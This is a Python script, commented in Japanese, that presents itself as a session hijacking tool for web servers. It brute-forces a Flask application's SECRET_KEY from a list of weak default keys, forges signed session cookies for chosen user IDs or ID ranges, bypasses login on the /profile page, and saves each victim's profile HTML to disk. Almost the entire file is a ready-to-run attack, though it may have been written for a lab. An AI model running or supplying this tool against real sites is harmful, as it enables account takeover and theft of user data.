import requests
from flask import Flask
import argparse


def parse_user_ids(user_id_str):
    """ユーザーID文字列をパースしてリストを返す"""
    if '-' in user_id_str:
        try:
            start, end = map(int, user_id_str.split('-', 1))
            return [str(i) for i in range(min(start, end), max(start, end) + 1)]
        except ValueError:
            return ['1']
    return [user_id_str]


def create_serializer(secret_key):
    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    return app.session_interface.get_signing_serializer(app)


def create_session_data(user_id, variant=0):
    """偽造するセッションデータを作成"""
    variants = [
        {"_user_id": user_id, "_fresh": True, "_id": user_id},
        {"user_id": user_id, "_fresh": True, "_id": user_id},
        {"_user_id": user_id, "_fresh": True, "_id": user_id, "_permanent": True},
    ]
    return variants[variant % len(variants)]


def is_attack_successful(response):
    """レスポンスから攻撃成功を判定"""
    if response.status_code == 200:
        text = response.text
        if 'ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text:
            return False
        if "プロフィール" in text or "ユーザー名" in text:
            return True
        return True  # ログインページでない200は成功と判断
    elif response.status_code == 302:
        location = response.headers.get('Location', '')
        return '/login' not in location.lower()
    return False


def test_secret_key(secret_key, target_url, test_user_id, variant=0):
    """SECRET_KEYをテストして有効性を確認"""
    serializer = create_serializer(secret_key)
    cookie = serializer.dumps(create_session_data(test_user_id, variant))
    
    session = requests.Session()
    session.cookies.set('session', cookie)
    response = session.get(f'{target_url}/profile', allow_redirects=False)
    
    return serializer if is_attack_successful(response) else None


def discover_secret_key(secret_keys, target_url, test_user_id):
    """SECRET_KEYを総当たりで特定"""
    print("\n[*] 試行するSECRET_KEY候補:")
    for i, key in enumerate(secret_keys, 1):
        print(f"  {i}. {key}")
    
    for secret_key in secret_keys:
        print(f"\n[*] SECRET_KEYを試行: {secret_key}")
        for variant in range(3):
            serializer = test_secret_key(secret_key, target_url, test_user_id, variant)
            if serializer:
                print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
                return secret_key, serializer, variant
        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗")
    
    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
    print(f"[!] デフォルトのSECRET_KEY '{secret_keys[0]}' を使用します")
    return secret_keys[0], create_serializer(secret_keys[0]), 0


def hijack_user_session(user_id, serializer, target_url, session_variant=0):
    """指定されたユーザーIDでセッションハイジャックを実行"""
    print(f"\n{'='*80}")
    print(f"[*] ユーザーID {user_id} でセッションハイジャックを試行中...")
    print(f"{'='*80}")
    
    cookie = serializer.dumps(create_session_data(user_id, session_variant))
    print(f"[*] 偽造したセッションクッキー: {cookie[:60]}...")
    
    session = requests.Session()
    session.cookies.set('session', cookie)
    response = session.get(f'{target_url}/profile', allow_redirects=False)
    print(f"ステータスコード: {response.status_code}")
    
    if response.status_code == 302:
        redirect_location = response.headers.get('Location', '')
        print(f"[*] リダイレクト先: {redirect_location}")
        if '/login' in redirect_location:
            redirect_url = redirect_location if redirect_location.startswith('http') else f'{target_url}{redirect_location}'
            response = session.get(redirect_url, allow_redirects=True)
    
    if is_attack_successful(response):
        print("[+] 攻撃成功: 認証をバイパスしました")
        output_filename = f"profile_page_user_{user_id}.html"
        try:
            with open(output_filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"[*] HTML情報を {output_filename} に出力しました")
        except Exception as e:
            print(f"[!] HTML情報の出力エラー: {e}")
    else:
        print("[*] 攻撃失敗: 認証が必要です")


def main():
    parser = argparse.ArgumentParser(
        description='WEBサーバーに対するセッションハイジャックツール',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py --url http://example.com:8080
  python 001session_hijack.py -u http://localhost:5000 -i 2
  python 001session_hijack.py -u http://localhost:5000 -i 1-2
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
    parser.add_argument('-i', dest='user_id', default='1', 
                       help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
    
    args = parser.parse_args()
    target_url = args.url.rstrip('/')
    target_user_ids = parse_user_ids(args.user_id)
    
    SECRET_KEYS = [
        "secret",
        "secret-key",
        "testkey",
        "ecre-key",
        "your-secret-key-change-in-production",
        "secret-keys",
    ]
    
    print("="*80)
    print("SECRET_KEYの特定とセッションハイジャック")
    print("="*80)
    print(f"\n[*] ターゲットURL: {target_url}")
    print(f"[*] 攻撃対象のユーザーID: {', '.join(target_user_ids)} (合計{len(target_user_ids)}個)")
    
    used_secret_key, serializer, session_variant = discover_secret_key(SECRET_KEYS, target_url, target_user_ids[0])
    print(f"\n[*] 使用したSECRET_KEY: {used_secret_key}")
    
    for user_id in target_user_ids:
        hijack_user_session(user_id, serializer, target_url, session_variant)


if __name__ == '__main__':
    main()
